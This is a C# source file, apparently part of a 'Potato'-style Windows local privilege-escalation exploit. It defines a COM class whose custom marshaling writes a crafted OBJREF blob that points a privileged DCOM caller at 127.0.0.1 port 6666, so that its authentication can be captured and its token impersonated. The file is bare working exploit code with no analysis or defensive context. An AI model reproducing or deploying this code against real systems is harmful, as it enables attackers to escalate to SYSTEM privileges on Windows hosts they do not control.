using Microsoft.VisualStudio.OLE.Interop;
using System;
using IS = System.Runtime.InteropServices;

namespace Potato
{
    [IS.ComVisible(true)]
    public class TestClass : IMarshal, IStorage
    {
        private IStorage _stg;

        public TestClass(IStorage stg)
        {
            _stg = stg;
        }

        public void DisconnectObject(uint dwReserved)
        {
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize)
        {
            pSize = 1024;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid)
        {
            pCid = new Guid("00000306-0000-0000-c000-000000000046");
        }

        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS)
        {
            uint written;
            byte[] data = { 0x4D, 0x45, 0x4F, 0x57, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x94, 0x09, 0x34, 0x76,
                0xC0, 0xF0, 0x15, 0xD8, 0x19, 0x8F, 0x4A, 0xA2, 0xCE, 0x05, 0x60, 0x86, 0xA3, 0x2A, 0x0F, 0x09, 0x24, 0xE8, 0x70,
                0x2A, 0x85, 0x65, 0x3B, 0x33, 0x97, 0xAA, 0x9C, 0xEC, 0x16, 0x00, 0x12, 0x00, 0x07, 0x00, 0x31, 0x00, 0x32, 0x00,
                0x37, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x5B, 0x00, 0x36, 0x00, 0x36,
                0x00, 0x36, 0x00, 0x36, 0x00, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00 };
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void ReleaseMarshalData(IStream pstm)
        {
        }

        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv)
        {
            ppv = IntPtr.Zero;
        }

        public void Commit(uint grfCommitFlags)
        {
            _stg.Commit(grfCommitFlags);
        }

        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest)
        {
            _stg.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
        }

        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg)
        {
            _stg.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
        }

        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm)
        {
            _stg.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
        }

        public void DestroyElement(string pwcsName)
        {
            _stg.DestroyElement(pwcsName);
        }

        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum)
        {
            _stg.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
        }

        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags)
        {
            _stg.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
        }

        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg)
        {
            _stg.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
        }

        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm)
        {
            _stg.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
        }

        public void RenameElement(string pwcsOldName, string pwcsNewName)
        {

        }

        public void Revert()
        {

        }

        public void SetClass(ref Guid clsid)
        {

        }

        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime)
        {

        }

        public void SetStateBits(uint grfStateBits, uint grfMask)
        {
        }

        public void Stat(STATSTG[] pstatstg, uint grfStatFlag)
        {
            _stg.Stat(pstatstg, grfStatFlag); 
            pstatstg[0].pwcsName = "hello.stg";
        }
    }
}